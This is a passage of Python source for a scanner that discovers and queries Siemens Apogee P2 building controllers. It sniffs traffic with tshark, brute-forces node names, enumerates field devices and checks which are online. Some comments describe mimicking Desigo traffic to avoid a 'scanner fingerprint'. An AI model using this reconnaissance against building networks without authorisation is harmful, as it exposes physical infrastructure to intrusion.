    name = sniff_network_name(duration=10)
    if name:
        return name

    return None


def sniff_network_name(duration: int = 10, interface: str = None) -> Optional[str]:
    """
    Use tshark to do a live capture and extract the P2 network name
    from any P2 traffic on the wire. Requires Wireshark/tshark installed.

    Args:
        duration: Seconds to capture (default 10)
        interface: Network interface to capture on (auto-detected if None)

    Returns:
        P2 network name string, or None if not found
    """
    global P2_NETWORK, P2_SITE
    import subprocess
    import shutil
    import tempfile
    import os

    # Find tshark
    tshark = shutil.which('tshark')
    if not tshark:
        # Check common Windows install paths
        for path in [
            r'C:\Program Files\Wireshark\tshark.exe',
            r'C:\Program Files (x86)\Wireshark\tshark.exe',
        ]:
            if os.path.exists(path):
                tshark = path
                break

    if not tshark:
        return None

    print(f"    Found tshark: {tshark}")
    print(f"    Capturing P2 traffic for {duration} seconds...")

    # Create temp file for capture. NamedTemporaryFile(delete=False) creates
    # the file atomically with secure permissions and returns its name, avoiding
    # the TOCTOU race in the deprecated tempfile.mktemp(). The file is closed
    # on context exit so tshark can reopen it; cleanup happens in the finally
    # block below.
    with tempfile.NamedTemporaryFile(delete=False, suffix='.pcapng') as _tf:
        tmpfile = _tf.name

    try:
        # Build tshark command
        cmd = [tshark, '-a', f'duration:{duration}',
               '-f', 'tcp port 5033', '-w', tmpfile, '-q']
        if interface:
            cmd.extend(['-i', interface])

        result = subprocess.run(cmd, capture_output=True, text=True,
                              timeout=duration + 10)

        if not os.path.exists(tmpfile) or os.path.getsize(tmpfile) < 100:
            print(f"    No P2 traffic captured")
            return None

        # Parse the capture for network name
        print(f"    Captured {os.path.getsize(tmpfile)} bytes, parsing...")
        try:
            sniff_pcap(tmpfile, "table")
        except Exception:
            pass

        if P2_NETWORK:
            print(f"    Learned network name: {P2_NETWORK}")
            return P2_NETWORK

        # Manual parse if sniff_pcap didn't set it
        try:
            with open(tmpfile, 'rb') as f:
                raw = f.read()
            # Look for P2 routing strings (null-terminated after msg type 0x33)
            for i in range(len(raw) - 20):
                if raw[i:i+4] == b'\x00\x00\x003':  # msg type 0x33
                    # Skip header, look for null-terminated strings
                    buf = b""
                    for j in range(i + 12, min(i + 100, len(raw))):
                        if raw[j] == 0 and buf:
                            try:
                                s = buf.decode('ascii')
                                if s.isprintable() and len(s) >= 3 and '|' not in s:
                                    P2_NETWORK = s
                                    print(f"    Learned network name: {P2_NETWORK}")
                                    return P2_NETWORK
                            except Exception:
                                pass
                            buf = b""
                        elif 32 <= raw[j] < 127:
                            buf += bytes([raw[j]])
                        else:
                            buf = b""
        except Exception:
            pass

        return None

    except subprocess.TimeoutExpired:
        print(f"    Capture timed out")
        return None
    except FileNotFoundError:
        print(f"    tshark not found or cannot execute")
        return None
    except PermissionError:
        print(f"    Permission denied — try running as Administrator")
        return None
    finally:
        try:
            os.unlink(tmpfile)
        except Exception:
            pass


def probe_p2_host(host: str) -> Optional[Dict[str, str]]:
    """
    Connect to a P2 host, blast heartbeats with many node names on a single
    connection, and learn its identity from whichever one it responds to.
    Returns dict with 'node_name', 'network', 'site' — or None on failure.
    Auto-learns and sets P2_NETWORK and P2_SITE globals on first success.
    """
    global P2_NETWORK, P2_SITE

    # Common PXC node naming patterns to try
    probe_names = (
        [f"node{i}" for i in range(1, 21)] +
        [f"NODE{i}" for i in range(1, 21)] +
        [f"PXC{i}" for i in range(1, 11)] +
        [f"MEC{i}" for i in range(1, 11)] +
        [f"MBC{i}" for i in range(1, 6)] +
        [f"AHU{i}" for i in range(1, 11)] +
        [f"BLR{i}" for i in range(1, 6)] +
        [f"FLR{i}" for i in range(1, 16)] +
        ["PANEL1", "PANEL2", "PANEL3", "MAIN", "LOBBY", "PENT",
         "PENTHOUSE", "BOILER", "CHILLER", "COOLING"]
    )

    net = P2_NETWORK.encode('ascii') if P2_NETWORK else b'P2NET'
    scanner = effective_scanner_name().encode('ascii')
    site = P2_SITE.encode('ascii') if P2_SITE else b'SITE'

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((host, P2_PORT))

        # Blast all heartbeats on this one connection
        for seq, target_name in enumerate(probe_names, start=100):
            target = target_name.encode('ascii')
            routing = b'\x00' + net + b'\x00' + target + b'\x00' + net + b'\x00' + scanner + b'\x00'
            # Trailer per APOGEE_P2_SPEC.md §9 — see _handshake()
            # in P2Connection for the byte layout.
            identity = (
                b'\x46\x40' +
                b'\x01' + struct.pack('>H', len(scanner)) + scanner +
                b'\x01' + struct.pack('>H', len(site)) + site +
                b'\x01' + struct.pack('>H', len(net)) + net +
                b'\x00\x01\x01\x00' +                  # separator + 3 flag bytes
                b'\x00\x00\x00\x00\x00' +              # 5 reserved zeros
                struct.pack('>I', int(time.time())) + # 4-byte timestamp
                b'\x00\x00' +                          # 2-byte session id
                b'\x00'                                # trailing null
            )
            payload = routing + identity
            msg = struct.pack('>III', 12 + len(payload), 0x33, seq) + payload
            try:
                s.sendall(msg)
            except (BrokenPipeError, ConnectionResetError, OSError):
                break
            time.sleep(0.01)  # 10ms between sends

        # Now read any response — the PXC responds only to the matching name
        s.settimeout(3)
        data = b""
        try:
            while len(data) < 4096:
                chunk = s.recv(4096)
                if not chunk:
                    break
                data += chunk
                s.settimeout(0.5)  # short timeout for additional data
        except socket.timeout:
            pass

        s.close()

        if not data or len(data) < 20:
            return None

        # Parse the response
        resp_payload = data[12:]
        if not resp_payload or resp_payload[0] != 0x01:
            return None

        # Extract routing strings
        null_strings = []
        buf = b""
        for b in resp_payload[1:]:
            if b == 0:
                if buf:
                    try:
                        null_strings.append(buf.decode('ascii'))
                    except Exception:
                        null_strings.append("")
                    buf = b""
                    if len(null_strings) >= 4:
                        break
            else:
                buf += bytes([b])

        result = {}

        # Learn network name
        if len(null_strings) >= 1:
            learned_net = null_strings[0]
            if learned_net and learned_net != SCANNER_NAME:
                result['network'] = learned_net
                if not P2_NETWORK:
                    P2_NETWORK = learned_net

        # Learn node name (4th routing string)
        if len(null_strings) >= 4:
            node_name = null_strings[3]
            our_names = {SCANNER_NAME} | {s.split('|')[0] for s in [SCANNER_NAME] if '|' in s}
            if node_name and node_name not in our_names:
                result['node_name'] = node_name.upper()

        # Fallback: figure out which name matched from the sequence number
        if 'node_name' not in result and len(data) >= 12:
            resp_seq = struct.unpack('>I', data[8:12])[0]
            idx = resp_seq - 100
            if 0 <= idx < len(probe_names):
                result['node_name'] = probe_names[idx].upper()

        # Learn site from length-prefixed identity block
        lp_strings = []
        i = 0
        while i < len(resp_payload) - 3:
            if resp_payload[i] == 0x01 and resp_payload[i+1] == 0x00 and 0 < resp_payload[i+2] < 30:
                slen = resp_payload[i+2]
                if i + 3 + slen <= len(resp_payload):
                    try:
                        st = resp_payload[i+3:i+3+slen].decode('ascii')
                        if st.isprintable():
                            lp_strings.append(st)
                    except Exception:
                        pass
                    i += 3 + slen
                    continue
            i += 1

        known = {result.get('network', ''), result.get('node_name', ''),
                 SCANNER_NAME, P2_NETWORK}
        for st in lp_strings:
            if st not in known and 2 <= len(st) <= 10:
                result['site'] = st
                if not P2_SITE:
                    P2_SITE = st
                break

        return result if 'node_name' in result else None

    except (socket.error, socket.timeout, OSError):
        return None


def discover_node_name(host: str) -> Optional[str]:
    """Connect to a PXC and learn its P2 node name. Wrapper for probe_p2_host."""
    result = probe_p2_host(host)
    return result['node_name'] if result else None


# Per-host dialect cache. Keyed by host IP string. Values are 0x33 or 0x34.
# Saves a ~2-second probe on every subsequent connection to the same PXC within
# a single process lifetime — notable for building-wide sweeps that hit each
# panel multiple times (discover, then verify, then read_all).
_DIALECT_CACHE: Dict[str, int] = {}


def _recv_one_frame(sock: socket.socket, max_payload: int = 65536,
                    overall_timeout: float = 3.0) -> Optional[bytes]:
    """Read exactly one P2 frame from sock and return total bytes.

    Replaces the older "recv-until-timeout" pattern in raw-socket call
    sites like get_node_info and enumerate_fln_devices. The frame layout
    (APOGEE_P2_SPEC.md §4.4) puts a u32 BE total_length at offset 0, so we
    can buffer to the exact length and avoid both truncation (slow links)
    and over-reading (multiple frames piggybacked from the panel).

    Returns the complete frame bytes (header+payload) on success, or None
    on EOF, timeout before the frame is complete, or a malformed length
    prefix.
    """
    sock.settimeout(overall_timeout)
    buf = bytearray()
    # Step 1: read the 4-byte length prefix.
    while len(buf) < 4:
        try:
            chunk = sock.recv(4096)
        except (socket.timeout, OSError):
            return None
        if not chunk:
            return None
        buf.extend(chunk)
    total_len = struct.unpack('>I', bytes(buf[:4]))[0]
    # Sanity-check: spec §4.4 minimum frame is 12 bytes (header only); maximum
    # is bounded by max_payload + 12. A length outside this window is a
    # framing failure — bail rather than try to recover.
    if total_len < 12 or total_len > max_payload + 12:
        return None
    # Step 2: top up to total_len.
    while len(buf) < total_len:
        try:
            chunk = sock.recv(min(4096, total_len - len(buf)))
        except (socket.timeout, OSError):
            return None
        if not chunk:
            return None
        buf.extend(chunk)
    return bytes(buf[:total_len])


def _probe_dialect(sock: socket.socket, handshake_msg_0x33: bytes,
                   handshake_msg_0x34: bytes,
                   host: Optional[str] = None) -> Optional[int]:
    """Send a handshake probe and detect which message-type dialect the PXC speaks.

    PXC firmware splits into two dialects:
      - Legacy (PME1252 and earlier): operational traffic uses msg_type 0x33 DATA.
        Handshake is 0x33-in, 0x33-out.
      - Modern (firmware build PME1300 on PXME hardware): operational traffic uses msg_type 0x34 HEARTBEAT.
        Handshake is 0x34-in, 0x34-out.

    A PXC silently drops handshakes sent with the wrong msg_type. The detection
    strategy: try 0x33 first with a short timeout; if nothing comes back, retry
    as 0x34. Returns the confirmed msg_type (0x33 or 0x34) on success, or None on
    total failure.

    Both handshake payloads should be pre-built by the caller with identical
    routing + identity bodies but different msg_type bytes in the 12-byte header.

    If `host` is provided, the detected dialect is cached for subsequent calls
    against the same host. The cache is process-local — site.json doesn't
    persist it, so a fresh process pays the probe cost once per panel.
    """
    # Check cache first. If we've seen this host before, skip the probe.
    if host is not None and host in _DIALECT_CACHE:
        cached = _DIALECT_CACHE[host]
        msg = handshake_msg_0x33 if cached == 0x33 else handshake_msg_0x34
        try:
            sock.sendall(msg)
            sock.settimeout(3.0)
            data = sock.recv(4096)
            if data:
                return cached
            # Cache hit produced no response — panel may have flipped dialect
            # (firmware upgrade?) or the cache entry is stale. Fall through to
            # full probe to rediscover.
            del _DIALECT_CACHE[host]
        except socket.error:
            # Socket died mid-cache-check. Caller has to deal with this.
            return None

    try:
        sock.sendall(handshake_msg_0x33)
        sock.settimeout(HANDSHAKE_PROBE_TIMEOUT)
        data = sock.recv(4096)
        if data:
            # Legacy dialect confirmed — use 0x33 for the rest of the session
            if host is not None:
                _DIALECT_CACHE[host] = 0x33
            return 0x33
    except socket.timeout:
        pass
    except socket.error:
        return None

    # No response on 0x33. Try 0x34.
    try:
        sock.sendall(handshake_msg_0x34)
        sock.settimeout(3.0)
        data = sock.recv(4096)
        if data:
            if host is not None:
                _DIALECT_CACHE[host] = 0x34
            return 0x34
    except (socket.timeout, socket.error):
        return None

    return None


def get_node_info(host: str, node_name: str) -> Optional[Dict]:
    """
    Query firmware version and panel info from a PXC node using opcode 0x0100.
    Returns dict with revision strings, or None on failure.
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((host, P2_PORT))
    except Exception:
        return None

    net = (P2_NETWORK if P2_NETWORK else "P2NET").encode('ascii')
    scanner = effective_scanner_name().encode('ascii')
    site = (P2_SITE if P2_SITE else "SITE").encode('ascii')
    node_lower = node_name.lower().encode('ascii')

    # Build the handshake payload once. We'll wrap it with two different msg_type
    # bytes and try each in turn via _probe_dialect().
    routing = b'\x00' + net + b'\x00' + node_lower + b'\x00' + net + b'\x00' + scanner + b'\x00'
    identity = (
        b'\x46\x40' +
        b'\x01' + struct.pack('>H', len(scanner)) + scanner +
        b'\x01' + struct.pack('>H', len(site)) + site +
        b'\x01' + struct.pack('>H', len(net)) + net +
        # Trailer: separator + 3 flags + 5 reserved + 4-byte timestamp +
        # 2-byte session id (00 00 = panel-style) + trailing null = 16 bytes.
        # See APOGEE_P2_SPEC.md §9 for the documented format.
        b'\x00\x01\x01\x00\x00\x00\x00\x00\x00' +
        struct.pack('>I', int(time.time())) + b'\x00\x00\x00'
    )
    # Random 24-bit seq matches real Desigo behavior — see APOGEE_P2_SPEC.md
    # "Sequence number field". Both dialect probes share the seq so they
    # look like alternative attempts of one handshake.
    _hs_seq = secrets.randbits(24)
    hs_0x33 = struct.pack('>III', 12 + len(routing) + len(identity), 0x33, _hs_seq) + routing + identity
    hs_0x34 = struct.pack('>III', 12 + len(routing) + len(identity), 0x34, _hs_seq) + routing + identity

    dialect = _probe_dialect(s, hs_0x33, hs_0x34, host=host)
    if dialect is None:
        s.close()
        return None

    # Send opcode 0x0100 (GetRevString) — try with empty data
    info_routing = b'\x00' + net + b'\x00' + node_lower + b'\x00' + net + b'\x00' + scanner + b'\x00'
    info_data = struct.pack('>H', 0x0100)
    # Random 24-bit seq avoids the seq=0/1/10 "scanner fingerprint" that
    # stricter future firmware may reject; matches the P2Connection
    # convention (see APOGEE_P2_SPEC.md §5.2 / §8.4).
    _info_seq = secrets.randbits(24)
    msg = struct.pack('>III', 12 + len(info_routing) + len(info_data), dialect, _info_seq) + info_routing + info_data

    try:
        s.sendall(msg)
        # Buffer to the frame's exact total_length per APOGEE_P2_SPEC.md §4.4
        # instead of the older "read until timeout" pattern. The old pattern
        # truncated on slow links (fragmented frames could time out mid-read)
        # and over-read when the panel piggybacked a push frame onto the
        # response.
        data = _recv_one_frame(s, overall_timeout=3.0)
        s.close()

        if not data or len(data) <= 55 or data[12] == 0x05:
            return None

        # Extract strings from response
        payload = data[12:]
        pos = 1
        nulls = 0
        while pos < len(payload) and nulls < 4:
            if payload[pos] == 0: nulls += 1
            pos += 1

        data_area = payload[pos:]
        strings = []
        i = 0
        while i < len(data_area) - 2:
            slen = struct.unpack('>H', data_area[i:i+2])[0]
            if 0 < slen < 60 and i + 2 + slen <= len(data_area):
                try:
                    st = data_area[i+2:i+2+slen].decode('ascii')
                    if st.isprintable():
                        strings.append(st)
                        i += 2 + slen
                        continue
                except Exception: pass
            i += 1

        routing_set = {P2_NETWORK, SCANNER_NAME, P2_SITE, node_name.upper(), node_name.lower()}
        info_strings = [st for st in strings if st not in routing_set]

        return {
            'firmware': info_strings[0] if len(info_strings) > 0 else '?',
            'model': info_strings[1] if len(info_strings) > 1 else '?',
            'extra': info_strings[2] if len(info_strings) > 2 else '',
            'raw_strings': info_strings,
        }
    except Exception:
        s.close()
        return None


def get_device_application(host: str, node_name: str, device_name: str) -> Optional[int]:
    """Read the APPLICATION number from a specific device."""
    conn = P2Connection(host, network=P2_NETWORK if P2_NETWORK else "P2NET",
                        scanner_name=SCANNER_NAME)
    if not conn.connect(node_name.lower()):
        return None
    result = conn.read_point(device_name, "APPLICATION", node_name.lower())
    conn.close()
    if result and result.get('value') is not None:
        return int(result['value'])
    return None


def enumerate_fln_devices(host: str, node_name: str) -> List[Dict]:
    """
    Enumerate all FLN devices on a PXC node using opcode 0x0986.
    No brute force — asks the PXC to list every device on its FLN bus.
    
    Returns list of dicts with 'device', 'description', 'application'.
    """
    found = []
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((host, P2_PORT))
    except (socket.error, socket.timeout) as e:
        print(f"    [ERROR] Connection failed: {e}")
        return []

    try:

        net = (P2_NETWORK if P2_NETWORK else "P2NET").encode('ascii')
        scanner = effective_scanner_name().encode('ascii')
        site = (P2_SITE if P2_SITE else "SITE").encode('ascii')
        node_lower = node_name.lower().encode('ascii')

        # Build both dialect variants of the handshake and probe to see which the
        # PXC wants. See _probe_dialect() for why this exists.
        routing = b'\x00' + net + b'\x00' + node_lower + b'\x00' + net + b'\x00' + scanner + b'\x00'
        identity = (
            b'\x46\x40' +
            b'\x01' + struct.pack('>H', len(scanner)) + scanner +
            b'\x01' + struct.pack('>H', len(site)) + site +
            b'\x01' + struct.pack('>H', len(net)) + net +
            # Trailer: separator + 3 flags + 5 reserved + 4-byte timestamp +
            # 2-byte session id (00 00 = panel-style) + trailing null = 16 bytes.
            # See APOGEE_P2_SPEC.md §9 for the documented format.
            b'\x00\x01\x01\x00\x00\x00\x00\x00\x00' +
            struct.pack('>I', int(time.time())) + b'\x00\x00\x00'
        )
        # Random 24-bit seq matches real Desigo behavior — see APOGEE_P2_SPEC.md
        # "Sequence number field". Both dialect probes share the seq so they
        # look like alternative attempts of one handshake.
        _hs_seq = secrets.randbits(24)
        hs_0x33 = struct.pack('>III', 12 + len(routing) + len(identity), 0x33, _hs_seq) + routing + identity
        hs_0x34 = struct.pack('>III', 12 + len(routing) + len(identity), 0x34, _hs_seq) + routing + identity

        dialect = _probe_dialect(s, hs_0x33, hs_0x34, host=host)
        if dialect is None:
            s.close()
            print(f"    [ERROR] Handshake failed")
            return []

        cursor = "*"
        # Random 24-bit seq base avoids the scanner-fingerprint pattern
        # (low constant values) — APOGEE_P2_SPEC.md §5.2 / §8.4. We still
        # increment monotonically; only the starting point is randomized.
        seq = secrets.randbits(24)

        for iteration in range(200):
            seq += 1
            cb = cursor.encode('ascii')
            enum_data = (struct.pack('>H', 0x0986) +
                         b'\x00\x00\x00' + struct.pack('>H', 1) + b'*' +
                         b'\x00\x00\x00' + struct.pack('>H', len(cb)) + cb)
            enum_routing = b'\x00' + net + b'\x00' + node_lower + b'\x00' + net + b'\x00' + scanner + b'\x00'
            msg = struct.pack('>III', 12 + len(enum_routing) + len(enum_data), dialect, seq) + enum_routing + enum_data
        
            try:
                s.sendall(msg)
            except (BrokenPipeError, ConnectionResetError, OSError):
                break

            # Buffer to exact frame length per APOGEE_P2_SPEC.md §4.4. The
            # previous "recv until short timeout" pattern truncated on slow
            # links (large enumerate responses can fragment across TCP
            # segments) and over-read when the panel piggybacked a push
            # frame onto the response.
            data = _recv_one_frame(s, overall_timeout=3.0)
            if not data or len(data) <= 55:
                break
            if data[12] == 0x05:
                break
        
            # Parse: skip P2 header + routing, extract length-prefixed strings
            payload = data[12:]
            pos = 1
            nulls = 0
            while pos < len(payload) and nulls < 4:
                if payload[pos] == 0: nulls += 1
                pos += 1
        
            if pos >= len(payload): break
            data_area = payload[pos:]
        
            # Extract all length-prefixed strings from data area
            strings = []
            i = 0
            while i < len(data_area) - 2:
                slen = struct.unpack('>H', data_area[i:i+2])[0]
                if 0 < slen < 60 and i + 2 + slen <= len(data_area):
                    try:
                        st = data_area[i+2:i+2+slen].decode('ascii')
                        if st.isprintable():
                            strings.append(st)
                            i += 2 + slen
                            continue
                    except Exception: pass
                i += 1
        
            routing_set = {P2_NETWORK, SCANNER_NAME, P2_SITE, node_name.upper(), node_name.lower()}
            device_strings = [st for st in strings if st not in routing_set]
        
            if not device_strings:
                break
        
            dev_name = device_strings[0]
            # Description is the last unique string that differs from device name
            # Response contains: [device_name, device_name, internal_name, display_name]
            # We want the display name (last one)
            desc = ''
            for st in device_strings[1:]:
                if st != dev_name:
                    desc = st  # keep overwriting — last one wins
        
            if dev_name == cursor:
                break  # End of list
        
            found.append({
                'device': dev_name,
                'description': desc,
                'application': 0,
            })
            sys.stdout.write(f"\r    \u2713 {dev_name:<20s}  {desc}\n")
            sys.stdout.flush()
        
            cursor = dev_name
    
    finally:
        s.close()
    sys.stdout.write(f"\r    Enumerate complete: {len(found)} devices found{'':20s}\n")
    return found


def _app_has_room_temp(application: int) -> Optional[bool]:
    """
    Check whether a given TEC application defines a ROOM TEMP point. Returns
    True/False from the app's point table, or None when the application is
    unknown (app=0 or not in tecpoints.json). Callers should treat None as
    "try ROOM TEMP anyway" to preserve the legacy behavior.
    """
    if not application:
        return None
    try:
        tbl = get_point_table(application)
    except Exception:
        return None
    if not tbl:
        return None
    for _addr, (name, _desc, _units, _ro) in tbl.items():
        if isinstance(name, str) and name.upper() == 'ROOM TEMP':
            return True
    return False


def verify_devices(host: str, node_name: str, devices: List[Dict],
                   show_filter: str = "all") -> List[Dict]:
    """
    Verify which enumerated devices are actually online.

    Strategy: prefer ROOM TEMP for the liveness probe — its comm_status flag
    is the authoritative live-FLN signal. For apps that don't define ROOM TEMP
    (chillers, boilers, fan coils with different point naming), we skip the
    wasted ROOM TEMP read and fall straight through to the APPLICATION-based
    fallback path.

    Args:
        host: PXC controller IP
        node_name: P2 node name
        devices: List of device dicts from enumerate
        show_filter: "all", "online", or "offline"

    Returns:
        Updated device list with 'status' field added ('online'/'offline')
    """
    if not devices:
        return devices

    conn = P2Connection(host, network=P2_NETWORK if P2_NETWORK else "P2NET",
                        scanner_name=SCANNER_NAME)
    if not conn.connect(node_name.lower()):
        print(f"    [ERROR] Could not connect for verification")
        return devices

    total = len(devices)
    online = 0
    offline = 0

    for i, dev in enumerate(devices):
        dev_name = dev['device']
        sys.stdout.write(f"\r    Verifying: {i+1}/{total} — {dev_name:<20s}")
        sys.stdout.flush()

        # Read ROOM TEMP first. ROOM TEMP is live FLN data, so the
        # comm_status flag in the response is the authoritative signal
        # for whether the device is online right now:
        #   comm_status=='online'      → live FLN read succeeded → ONLINE
        #   comm_status=='comm_fault'  → PXC handed back a stale-cached
        #                                value because the device is
        #                                FLN-faulted. This matches
        #                                Desigo's own "#COM" indicator
        #                                on the same point. → OFFLINE
        #   None (no ROOM TEMP point)  → device doesn't have a ROOM TEMP
        #                                point at all (some non-VAV apps).
        #                                Fall through to APPLICATION as a
        #                                last-resort registration probe.
        #
        # NOTE: an earlier version of this routine fell back to
        # APPLICATION whenever ROOM TEMP came back stale. APPLICATION is
        # panel-cached metadata (configured app number), not live FLN
        # data — it returns successfully even for #COM-faulted devices,
        # so falling back to it converts true offlines into false
        # onlines. Cross-checked against Desigo CC's own status display
        # (which shows ROOM TEMP=#COM and APPLICATION=2090 for the same
        # device): the live signal is comm_status, not APPLICATION
        # responsiveness.
        #
        # Per-app optimization: when the app catalog explicitly says this
        # device's application doesn't define ROOM TEMP (chillers/boilers
        # /non-VAV), skip the wasted probe and go straight to the
        # APPLICATION fallback. _app_has_room_temp returns None for
        # unknown apps, in which case we preserve the legacy "try ROOM
        # TEMP anyway" behavior.
        has_rt = _app_has_room_temp(dev.get('application', 0))
        if has_rt is False:
            result = None
        else:
            result = conn.read_point(dev_name, "ROOM TEMP", node_name.lower())

        dev['status'] = 'offline'

        # Surface comm_status on the dev dict regardless of classification.
        room_temp_comm = result.get('comm_status') if result else None
        if room_temp_comm:
            dev['comm_status'] = room_temp_comm

        if result and result.get('comm_status') == 'online':
            # Live ROOM TEMP read.
            dev['status'] = 'online'
            dev['room_temp'] = result.get('value')
            dev['units'] = result.get('units', '')
            if dev.get('application', 0) == 0:
                app_result = conn.read_point(dev_name, "APPLICATION", node_name.lower())
                if app_result and app_result.get('value') is not None:
                    dev['application'] = int(app_result['value'])
            online += 1
            continue

        if result and result.get('comm_status') == 'comm_fault':
            # PXC explicitly reports the device as FLN-faulted. Record
            # the stale value (useful for diagnostics — "last seen at...")
            # but DO NOT mark online. APPLICATION would lie here.
            dev['stale_temp'] = result.get('value')
            # Best-effort: if the panel still has APPLICATION cached,
            # surface it so the GUI can still show what the device is
            # configured as — but the device stays offline.
            if dev.get('application', 0) == 0:
                app_result = conn.read_point(dev_name, "APPLICATION", node_name.lower())
                if app_result and app_result.get('value') is not None:
                    dev['application'] = int(app_result['value'])
                    dev['application_cached'] = True
            offline += 1
            continue

        # No ROOM TEMP response at all (point doesn't exist, parse failed,
        # or the panel returned an error). Fall through to APPLICATION as
        # a last-resort probe — for devices without a ROOM TEMP point
        # this is the only way to confirm they exist. We treat success
        # here as "online" but flag it as a soft signal.
        result2 = conn.read_point(dev_name, "APPLICATION", node_name.lower())
        if result2 and result2.get('value') is not None:
            app_comm = result2.get('comm_status')
            if app_comm == 'comm_fault':
                # Even APPLICATION came back stale — definitely offline.
                dev['status'] = 'offline'
                dev['comm_status'] = 'comm_fault'
                if dev.get('application', 0) == 0:
                    dev['application'] = int(result2['value'])
                    dev['application_cached'] = True
                offline += 1
            else:
                dev['status'] = 'online'
                if dev.get('application', 0) == 0:
                    dev['application'] = int(result2['value'])
                online += 1
        else:
            offline += 1

    conn.close()

    # Print results based on filter
    sys.stdout.write(f"\r{'':60s}\r")
    print(f"    Verified: {online} online, {offline} offline, {total} total")
    print()

    for dev in devices:
        status = dev.get('status', '?')
        dev_name = dev['device']
        desc = dev.get('description', '')
        app = dev.get('application', 0)

        if show_filter == "online" and status != "online":
            continue
        if show_filter == "offline" and status != "offline":
            continue

        if status == 'online':
            temp = dev.get('room_temp')
            units = dev.get('units', '')
            app_str = f"APP {app}" if app else ""
            if temp is not None:
                print(f"    ✓ {dev_name:<20s} {app_str:>8s}  {temp:>6.1f}{units:<5s} {desc}")
            else:
                print(f"    ✓ {dev_name:<20s} {app_str:>8s}  {'':>11s} {desc}")
        else:
            # Offline: distinguish "FLN comm-faulted (PXC has stale cache)"
            # from "completely unreachable" so the user can tell whether
            # the device is wired up but failing or genuinely gone.
            stale = dev.get('stale_temp')
            app_str = f"APP {app}" if app else ""
            if dev.get('comm_status') == 'comm_fault':
                if stale is not None:
                    label = f"#COM (cached {stale:.0f}{dev.get('units', '')})"
                else:
                    label = "#COM"
                print(f"    ✗ {dev_name:<20s} {app_str:>8s}  {label:<24s} {desc}")
            else:
                print(f"    ✗ {dev_name:<20s} {app_str:>8s}  {'(no response)':<24s} {desc}")

    return devices


def discover_devices_on_node(host: str, node_name: str,
                             device_list: Optional[List[str]] = None,
                             use_enumerate: bool = True) -> List[Dict]:
    """
    Discover TEC devices on a PXC node.
    First tries FLN enumerate (opcode 0x0986) for a complete device list.
    Falls back to batched APPLICATION reads if enumerate fails.
    """
    # Try FLN enumerate first (fast, complete, no brute force)
    if use_enumerate and device_list is None:
        print(f"    Trying FLN enumerate...")
        devs = enumerate_fln_devices(host, node_name)
        if devs:
            return devs
        print(f"    Enumerate returned no devices, falling back to brute force...")

    candidates = device_list or DISCOVERY_DEVICE_PATTERNS
    found = []
    BATCH_SIZE = 25

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((host, P2_PORT))
    except (socket.error, socket.timeout) as e:
        print(f"    [ERROR] Connection failed: {e}")
        return []

    try:

        net = (P2_NETWORK if P2_NETWORK else "P2NET").encode('ascii')
        scanner = effective_scanner_name().encode('ascii')
        site = (P2_SITE if P2_SITE else "SITE").encode('ascii')
        node_lower = node_name.lower().encode('ascii')

        # Build both dialect variants for probe.
        routing_hb = b'\x00' + net + b'\x00' + node_lower + b'\x00' + net + b'\x00' + scanner + b'\x00'
        identity = (
            b'\x46\x40' +
            b'\x01' + struct.pack('>H', len(scanner)) + scanner +
            b'\x01' + struct.pack('>H', len(site)) + site +
            b'\x01' + struct.pack('>H', len(net)) + net +
            # Trailer: separator + 3 flags + 5 reserved + 4-byte timestamp +
            # 2-byte session id (00 00 = panel-style) + trailing null = 16 bytes.
            # See APOGEE_P2_SPEC.md §9 for the documented format.
            b'\x00\x01\x01\x00\x00\x00\x00\x00\x00' +
            struct.pack('>I', int(time.time())) + b'\x00\x00\x00'
        )
        hb_payload = routing_hb + identity
        _hs_seq = secrets.randbits(24)  # See APOGEE_P2_SPEC.md §5.2 / §8.4
        hs_0x33 = struct.pack('>III', 12 + len(hb_payload), 0x33, _hs_seq) + hb_payload
        hs_0x34 = struct.pack('>III', 12 + len(hb_payload), 0x34, _hs_seq) + hb_payload

        dialect = _probe_dialect(s, hs_0x33, hs_0x34, host=host)
        if dialect is None:
            s.close()
            print(f"    [ERROR] Handshake failed")
            return []

        total = len(candidates)
        base_seq = 5000
        num_batches = (total + BATCH_SIZE - 1) // BATCH_SIZE

        for batch_num in range(num_batches):
            batch_start = batch_num * BATCH_SIZE
            batch_end = min(batch_start + BATCH_SIZE, total)
            batch = candidates[batch_start:batch_end]

            sys.stdout.write(f"\r    Probing: {batch_end}/{total}{'':20s}")
            sys.stdout.flush()

            # Build and send this batch
            seq_map = {}
            batch_msgs = b""
            for i, dev in enumerate(batch):
                seq = base_seq + batch_start + i
                seq_map[seq] = dev
                dev_bytes = dev.encode('ascii')
                routing = (b'\x00' + net + b'\x00' + node_lower + b'\x00' +
                           net + b'\x00' + scanner + b'\x00')
                read_data = (
                    b'\x02\x71\x00\x00' +
                    b'\x01' + struct.pack('>H', len(dev_bytes)) + dev_bytes +
                    b'\x01\x00\x0bAPPLICATION' +
                    b'\x00\xff'
                )
                payload = routing + read_data
                msg = struct.pack('>III', 12 + len(payload), dialect, seq) + payload
                batch_msgs += msg

            try:
                s.sendall(batch_msgs)
            except (BrokenPipeError, ConnectionResetError, OSError):
                break

            # Collect responses for this batch
            all_data = b""
            s.settimeout(2)
            try:
                while True:
                    chunk = s.recv(16384)
                    if not chunk:
                        break
                    all_data += chunk
                    s.settimeout(0.3)
            except socket.timeout:
                pass
            except (ConnectionResetError, OSError):
                break

            # Parse responses
            pos = 0
            while pos < len(all_data) - 12:
                if len(all_data) - pos < 12:
                    break
                msg_len = struct.unpack('>I', all_data[pos:pos+4])[0]
                if msg_len < 12 or msg_len > len(all_data) - pos:
                    pos += 1
                    continue
                msg_data = all_data[pos:pos+msg_len]
                pos += msg_len
                if len(msg_data) < 13:
                    continue
                resp_seq = struct.unpack('>I', msg_data[8:12])[0]
                resp_flag = msg_data[12]
                if resp_flag != 1 or resp_seq not in seq_map:
                    continue
                dev_name = seq_map[resp_seq]
                if len(msg_data) <= 55:
                    continue

                # Try standard parser (3FFFFF flags)
                flags_idx = -1
                for fi in range(12, len(msg_data) - 3):
                    if msg_data[fi] == 0x3F and msg_data[fi+1] == 0xFF and msg_data[fi+2] == 0xFF:
                        flags_idx = fi
                        break
                if flags_idx >= 0:
